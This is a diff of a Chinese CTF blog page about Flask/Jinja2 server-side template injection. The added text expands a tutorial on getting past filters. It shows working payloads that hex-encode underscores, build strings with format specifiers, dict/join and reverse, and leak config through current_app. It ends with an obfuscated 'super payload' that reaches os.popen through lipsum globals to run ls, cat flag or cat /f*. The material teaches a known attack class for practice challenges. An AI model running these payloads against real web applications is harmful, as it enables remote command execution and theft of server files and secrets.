@@ -304,7 +304,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-19 15:52:03" itemprop="dateModified" datetime="2023-05-19T15:52:03+08:00">2023-05-19</time>
+                <time title="修改时间：2023-05-19 18:25:34" itemprop="dateModified" datetime="2023-05-19T18:25:34+08:00">2023-05-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -322,14 +322,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>9.1k</span>
+              <span>11k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>32 分钟</span>
+              <span>38 分钟</span>
             </span>
 
         </div>
@@ -430,15 +430,43 @@
 </li>
 <li><p><strong>过滤器+request模块</strong><br>可以用attr()过滤器+request模块实现对下划线的绕过<br>例如<br><code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于<code>&#123;&#123;()|attr('__class__')|attr('__base__')&#125;&#125;</code><br>配合<code>request</code>可以<br><code>?name=&#123;&#123;()|attr(request.args.cla)|attr(request.args.ba)&#125;&#125;&amp;cla=__class__&amp;ba=__base__</code></p>
 </li>
-<li><p><strong>过滤器+编码绕过</strong><br>unicode<br>16进制编码</p>
+<li><p><strong>编码绕过</strong><br><code>16进制编码</code>,用<code>\x5f</code>来代替下划线<code>_</code>,用<code>\x2e</code>代替小数点<code>.</code><br>例如<strong>paylaod</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;cat app\x2epy&quot;</span>)[<span class="string">&quot;read&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>格式化字符串</strong><br><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>类似于这样的形式,不仅是下划线,关键字也可以采用这样的方式绕过</p>
+</li>
+<li><p><strong>取字符绕过</strong><br><code>&#123;%set xhx=(lipsum|string|list)[18]%&#125;</code>类似于这样的形式,在一个字符串中找到需要的那个字符,然后根据索引取到字符</p>
 </li>
 </ol>
-<h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><p><code>[]</code>中括号绕过</p>
-<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><p>编码绕过<br>拼接绕过<code>[&#39;glo&#39;+&#39;bals&#39;]</code><br>过滤器绕过</p>
-<h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><p><code>Length</code>过滤器绕过<br>可以配合加减乘除</p>
-<h3 id="config获取配置信息"><a href="#config获取配置信息" class="headerlink" title="config获取配置信息"></a>config获取配置信息</h3><p>调用<code>current_app</code>相当于调用flask<br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messsages.__globals__['current_app'].config&#125;&#125;</code></p>
-<h3 id="过滤特殊符号"><a href="#过滤特殊符号" class="headerlink" title="过滤特殊符号"></a>过滤特殊符号</h3><p>利用flask内置函数和对象获取符号</p>
-<h3 id="dict和jion"><a href="#dict和jion" class="headerlink" title="dict和jion"></a>dict和jion</h3><h3 id="debug的pin"><a href="#debug的pin" class="headerlink" title="debug的pin"></a>debug的pin</h3><h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象,偶尔偶尔用的上吧,有时候用不上也不知道什么原因,可能是payload中的某些被过滤了</p>
+<h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><ol>
+<li><p>使用中括号<code>[]</code>绕过点<code>.</code><br>魔术方法和魔术方法之间的连接既可以用<code>.</code>,也可以用中括号,但是使用中括号必须用引号包裹字符串<br><code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于<code>&#123;&#123;()["__class__"]["__base__"]&#125;&#125;</code></p>
+</li>
+<li><p>使用<code>attr</code>过滤器<br>和前面下划线绕过差不多,不再演示了</p>
+</li>
+</ol>
+<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><ol>
+<li><p><strong>+拼接绕过</strong><br>最简单方法就是使用拼接<code>[&#39;glo&#39;+&#39;bals&#39;]</code>等价于<code>[&#39;globals&#39;]</code></p>
+</li>
+<li><p><strong>过滤器绕过</strong><br>前面介绍过的<code>reverse</code>反转过滤器<br>例如<code>&#123;%set a='__ssalc__'|reverse%&#125;&#123;&#123;a&#125;&#125;</code>,就是将<code>__ssalc__</code>逆序变成<code>__class__</code></p>
+</li>
+<li><p><strong>~拼接绕过</strong><br><strong>payload</strong><code>&#123;%set a="__cla"%&#125;&#123;%set b="ss__"%&#125;&#123;&#123;a~b&#125;&#125;</code></p>
+</li>
+<li><p><strong>其他</strong><br>类似于之前的编码绕过,格式化字符串,取字符绕过等方法也都是可以实现的,比较复杂,就不演示了</p>
+</li>
+</ol>
+<h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><ol>
+<li>Length过滤器绕过<br><strong>payload</strong><code>&#123;%set m='aaaaaaaaa'|length%&#125;&#123;&#123;m&#125;&#125;</code>这里的m为a的个数统计,为<code>9</code><br>可以配合加减乘除<br><code>&#123;%set m='aaaaaaaaaa'|length*'aa'|length%&#125;&#123;&#123;m&#125;&#125;</code>这边m等于9*2,为<code>18</code></li>
+</ol>
+<h3 id="config获取配置信息"><a href="#config获取配置信息" class="headerlink" title="config获取配置信息"></a>config获取配置信息</h3><p>flag有可能隐藏在<code>config</code>,无过滤的情况下可以直接<code>&#123;&#123;config&#125;&#125;</code>查看配置信息<br>有时候过滤了<code>config</code>,这时候可以利用内置函数或对象寻找被过滤的字符串<br>调用<code>current_app</code>相当于调用flask,绕一圈之后再使用config,效果和直接config是一样的<br><strong>payload</strong><br><code>&#123;&#123;url_for.__globals__['current_app']['con'+'fig']&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app']['con'+'fig']&#125;&#125;</code></p>
+<h3 id="过滤特殊符号"><a href="#过滤特殊符号" class="headerlink" title="过滤特殊符号"></a>过滤特殊符号</h3><p>利用flask内置函数和对象获取符号,就是前面提到的取字符绕过<br>主要思路就是使用<code>string</code>和<code>list</code>过滤器,将结果转化为字符串列表储存,然后通过索引调用需要的字符串<br><strong>payload</strong><code>&#123;&#123;(config|string|list)[编号]&#125;&#125;</code>,config换成任何一个内置函数或者对象都行</p>
+<h3 id="dict和jion"><a href="#dict和jion" class="headerlink" title="dict和jion"></a>dict和jion</h3><ol>
+<li><p><code>dict()</code>用来创建一个字典<br><code>&#123;%set a=dict(class=1)%&#125;&#123;&#123;a&#125;&#125;</code>  a为字典,键为<code>class</code>,值为<code>1</code></p>
+</li>
+<li><p><code>join</code> 将一个序列化中的参数值拼接成字符串<br><code>&#123;%set a=dict(__cla=1,ss__=1)|join%&#125;&#123;&#123;a&#125;&#125;</code>join过滤器可以将字典的键拼接,此时的<code>a=__class__</code></p>
+</li>
+</ol>
+<h3 id="debug的pin"><a href="#debug的pin" class="headerlink" title="debug的pin"></a>debug的pin</h3><h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象,偶尔偶尔用的上吧,有时候用不上也不知道什么原因,可能是payload中的某些被过滤了</p>
 <p>过滤了<code>下划线_</code>,<code>空格</code>,<code>单引号&#39;&#39;和双引号&quot;&quot;</code>,<code>数字</code>,<code>某些关键字</code>,<code>中括号[]</code>,<code>小数点.</code>,<code>\</code><br>可以考虑试一下下面这个payload,基本很难cat,因为小数点被过滤了比如<code>flag.txt</code>就cat不了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eighteen=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ge=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glo)|attr(ge)(o)|attr(pope)(sys)|attr(rea)()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>基本思路就是,在<code>lipsum</code>模块中找字符代替下划线和空格,用<code>dict(aaaaaaaaa=a)|join|count</code>来获取数字,用<code>dict+join</code>法绕过关键字<br><code>sys</code>是最后要执行的命令,可以改成<br><code>&#123;%set (sys=dict(cat=a)|join,kg,dict(fl=a,ag=a)|join)join%&#125;</code>这段代码等于cat flag<br>如果过滤的少点还可以<br><code>&#123;%set (sys=dict(cat=a)|join,kg,'/',dict(f=a)|join,'*')join%&#125;</code>这段代码等于<code>cat /f*</code>获取根目录下所有f开头的文件(用了通配符)</p>
@@ -1811,13 +1839,13 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">72k</span>
+    <span title="站点总字数">73k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:16</span>
+    <span title="站点阅读时长">4:21</span>
 </div>
 
 <!--
